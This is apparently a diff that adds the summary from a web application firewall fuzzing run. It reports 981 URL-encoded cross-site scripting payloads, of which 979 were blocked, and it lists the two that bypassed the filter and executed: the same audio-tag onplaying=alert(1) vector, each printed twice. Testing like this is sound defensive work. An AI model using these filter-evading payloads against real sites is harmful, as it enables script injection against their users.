@@ -1,0 +1,21 @@
+================================================================================
+File: url_encode.txt - Summary
+================================================================================
+Total Tested: 981
+Bypassed (WAF): 2
+Blocked (WAF): 979
+Bypass Rate: 0.20%
+
+>>> EXECUTED (Confirmed Success): 2
+>>> Execution Rate: 0.20%
+================================================================================
+
+EXECUTED PAYLOADS (Payload will trigger on server):
+--------------------------------------------------------------------------------
+%22%3Caudio%20autoplay%20onplaying%3Dalert%281%29%3E%3Csource%20src%3D%22%22validaudio.wav%22%22%20type%3D%22%22audio%2Fwav%22%22%3E%3C%2Faudio%3E%22
+%22%3Caudio%20autoplay%20onplaying%3Dalert%281%29%3E%3Csource%20src%3D%22%22validaudio.wav%22%22%20type%3D%22%22audio%2Fwav%22%22%3E%3C%2Faudio%3E%22
+
+ALL BYPASSED PAYLOADS:
+--------------------------------------------------------------------------------
+%22%3Caudio%20autoplay%20onplaying%3Dalert%281%29%3E%3Csource%20src%3D%22%22validaudio.wav%22%22%20type%3D%22%22audio%2Fwav%22%22%3E%3C%2Faudio%3E%22
+%22%3Caudio%20autoplay%20onplaying%3Dalert%281%29%3E%3Csource%20src%3D%22%22validaudio.wav%22%22%20type%3D%22%22audio%2Fwav%22%22%3E%3C%2Faudio%3E%22
